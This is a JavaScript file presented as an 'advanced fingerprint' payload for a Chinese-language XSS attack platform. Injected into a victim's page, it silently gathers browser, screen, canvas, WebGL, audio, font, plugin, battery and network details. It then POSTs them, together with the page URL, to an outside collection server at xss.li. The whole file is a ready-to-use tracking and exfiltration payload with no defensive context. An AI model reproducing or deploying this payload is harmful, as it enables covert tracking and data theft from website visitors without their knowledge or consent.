// 高级浏览器指纹Payload - 黑客仓库XSS平台
// 收集详细的浏览器指纹信息用于用户追踪

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php'
    };
    
    console.log('👆 黑客仓库XSS - 高级指纹模块');
    
    var fingerprint = {
        basic: {},
        advanced: {},
        hardware: {},
        software: {},
        network: {},
        hash: ''
    };
    
    // 基础信息
    fingerprint.basic = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack
    };
    
    // 屏幕信息
    fingerprint.hardware.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.type : null,
        pixelRatio: window.devicePixelRatio
    };
    
    // 时区
    fingerprint.basic.timezone = {
        offset: new Date().getTimezoneOffset(),
        name: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // Canvas指纹
    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            var txt = 'BrowserFingerprint,🖐️';
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText(txt, 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText(txt, 4, 17);
            
            return canvas.toDataURL();
        } catch (e) {
            return 'canvas_error';
        }
    }
    
    fingerprint.advanced.canvasHash = getCanvasFingerprint().substring(0, 100);
    
    // WebGL指纹
    function getWebGLFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return null;
            
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
            };
        } catch (e) {
            return null;
        }
    }
    
    fingerprint.advanced.webgl = getWebGLFingerprint();
    
    // 音频指纹
    function getAudioFingerprint() {
        try {
            var AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return null;
            
            var context = new AudioContext();
            var oscillator = context.createOscillator();
            var analyser = context.createAnalyser();
            var gainNode = context.createGain();
            var scriptProcessor = context.createScriptProcessor(4096, 1, 1);
            
            gainNode.gain.value = 0;
            oscillator.type = 'triangle';
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(context.destination);
            
            oscillator.start(0);
            
            return {
                sampleRate: context.sampleRate,
                state: context.state,
                maxChannelCount: context.destination.maxChannelCount
            };
        } catch (e) {
            return null;
        }
    }
    
    fingerprint.advanced.audio = getAudioFingerprint();
    
    // 字体检测
    function getFonts() {
        var baseFonts = ['monospace', 'sans-serif', 'serif'];
        var testFonts = [
            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
            'Microsoft YaHei', 'SimSun', 'SimHei', 'KaiTi', 'FangSong',
            'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS'
        ];
        
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        var detectedFonts = [];
        
        function getTextWidth(font) {
            ctx.font = '72px ' + font;
            return ctx.measureText('mmmmmmmmmmlli').width;
        }
        
        var baseWidths = {};
        baseFonts.forEach(function(font) {
            baseWidths[font] = getTextWidth(font);
        });
        
        testFonts.forEach(function(font) {
            var detected = baseFonts.some(function(baseFont) {
                return getTextWidth(font + ',' + baseFont) !== baseWidths[baseFont];
            });
            if (detected) {
                detectedFonts.push(font);
            }
        });
        
        return detectedFonts;
    }
    
    fingerprint.software.fonts = getFonts();
    
    // 插件信息
    fingerprint.software.plugins = Array.from(navigator.plugins).map(function(p) {
        return {
            name: p.name,
            description: p.description,
            filename: p.filename
        };
    });
    
    // 电池状态
    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            fingerprint.hardware.battery = {
                charging: battery.charging,
                level: battery.level,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            sendFingerprint();
        });
    }
    
    // 连接信息
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        fingerprint.network.connection = {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData
        };
    }
    
    // 生成指纹哈希
    function generateHash() {
        var str = JSON.stringify(fingerprint);
        var hash = 0;
        for (var i = 0; i < str.length; i++) {
            var char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }
    
    fingerprint.hash = generateHash();
    
    // 发送指纹数据
    async function sendFingerprint() {
        try {
            console.log('👆 指纹哈希:', fingerprint.hash);
            console.log('👆 检测到字体:', fingerprint.software.fonts.length);
            
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'advanced_fingerprint',
                    fingerprint: fingerprint,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
            
            if (response.ok) {
                console.log('✅ 指纹数据上传成功');
            }
        } catch (error) {
            console.error('发送指纹失败:', error);
        }
    }
    
    // 如果没有电池API，直接发送
    if (!navigator.getBattery) {
        sendFingerprint();
    }
    
})();
